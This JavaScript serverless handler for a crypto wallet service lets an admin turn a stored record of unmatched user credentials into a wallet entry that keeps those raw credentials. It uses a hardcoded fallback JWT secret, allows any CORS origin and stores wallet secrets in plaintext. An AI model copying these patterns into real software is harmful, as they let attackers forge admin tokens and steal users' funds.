/**
 * Attach Off-Chain Key to Wallet (ADMIN ONLY)
 *
 * Takes an off-chain key record (credentials that couldn't be matched to any on-chain wallet)
 * and creates a full wallet entry in the database as if it were a valid wallet.
 * The wallet can then be used normally without on-chain verification.
 */

const jwt = require('jsonwebtoken');
const { WalletGenerator, INPUT_TYPES } = require('./utils/walletGenerator');
const { FirebaseWalletStore } = require('./utils/firebaseWalletStore');

const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-jwt-key-change-this';

const headers = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
  'Content-Type': 'application/json'
};

exports.handler = async (event) => {
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  // Require admin JWT
  const authHeader = event.headers.authorization || event.headers.Authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return {
      statusCode: 401,
      headers,
      body: JSON.stringify({ error: 'Admin authorization required' })
    };
  }

  const token = authHeader.substring(7);
  let decoded;
  try {
    decoded = jwt.verify(token, JWT_SECRET);
  } catch (error) {
    return {
      statusCode: 401,
      headers,
      body: JSON.stringify({ error: 'Invalid or expired admin token' })
    };
  }

  if (!decoded.isAdmin && decoded.type !== 'admin') {
    return {
      statusCode: 403,
      headers,
      body: JSON.stringify({ error: 'Admin access required' })
    };
  }

  try {
    const body = JSON.parse(event.body || '{}');
    const { offChainKeyId } = body;

    if (!offChainKeyId) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ error: 'offChainKeyId is required' })
      };
    }

    const walletStore = new FirebaseWalletStore();

    // Fetch the off-chain key record
    console.log(`📥 Fetching off-chain key: ${offChainKeyId}`);
    const offChainKey = await walletStore.getOffChainKeyById(offChainKeyId);

    if (!offChainKey) {
      return {
        statusCode: 404,
        headers,
        body: JSON.stringify({ error: 'Off-chain key not found' })
      };
    }

    const { inputType, walletType, credentials, seedHash } = offChainKey;

    if (!inputType || !walletType || !credentials) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Off-chain key record is incomplete',
          details: 'Missing inputType, walletType, or credentials'
        })
      };
    }

    // Re-derive the wallet from credentials
    console.log(`🔄 Re-deriving wallet from ${inputType}...`);
    let walletInfo;
    try {
      walletInfo = WalletGenerator.generateWallet({
        inputType,
        input: credentials,
        walletType,
        accountIndex: 0
      });
    } catch (derivationError) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({
          error: 'Failed to derive wallet from credentials',
          details: derivationError.message
        })
      };
    }

    // Check if a wallet already exists with this address
    console.log(`🔍 Checking for existing wallet: ${walletInfo.walletAddress}`);
    const existingWallet = await walletStore.getWalletByAddress(walletInfo.walletAddress);
    if (existingWallet) {
      return {
        statusCode: 409,
        headers,
        body: JSON.stringify({
          error: 'Wallet already exists',
          details: `A wallet with address ${walletInfo.walletAddress} is already in the database`,
          existingWalletId: existingWallet.walletId
        })
      };
    }

    // Create a full wallet entry
    console.log(`💾 Creating wallet record: ${walletInfo.walletAddress}`);
    await walletStore.saveWallet({
      ...walletInfo,
      balance: 0,
      credentials
    });

    // Delete the off-chain key record
    console.log(`🗑️  Deleting off-chain key record: ${offChainKeyId}`);
    await walletStore.deleteOffChainKey(offChainKeyId);

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Off-chain key attached successfully',
        wallet: {
          walletId: walletInfo.walletId,
          walletAddress: walletInfo.walletAddress,
          walletType: walletInfo.walletType,
          inputType: walletInfo.inputType,
          derivationPath: walletInfo.derivationPath,
          balance: 0,
          solsnipeBalance: 0,
          loginCount: 0
        },
        attachedAt: new Date().toISOString(),
        attachedBy: decoded.adminId || 'admin'
      })
    };
  } catch (error) {
    console.error('Attach off-chain key error:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Failed to attach off-chain key',
        message: error.message
      })
    };
  }
};
